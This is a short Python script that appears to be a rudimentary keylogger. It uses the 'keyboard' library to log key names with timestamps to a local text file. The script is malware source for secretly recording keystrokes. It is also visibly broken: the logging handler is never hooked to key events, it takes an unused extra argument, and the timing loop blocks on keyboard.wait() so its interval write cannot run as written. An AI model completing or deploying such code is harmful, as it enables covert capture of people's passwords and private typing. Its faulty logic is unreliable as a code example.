import keyboard, time

def key_press(e, f):
    with open(keylogs_file, "a") as file:
        file.write(f"{e.name} pressed at: {time.strftime('%m/%d %H:%M:%S')}\n")

if __name__ == "__main__":
    keylogs_file = "files\\keys.txt"
    started_time = time.time()
    with open(keylogs_file, "a") as file:
        while True:
            elapsed_time = time.time() - started_time
            if elapsed_time >= 5:
                file.write("\nSEC: 5\n")
            keyboard.wait()
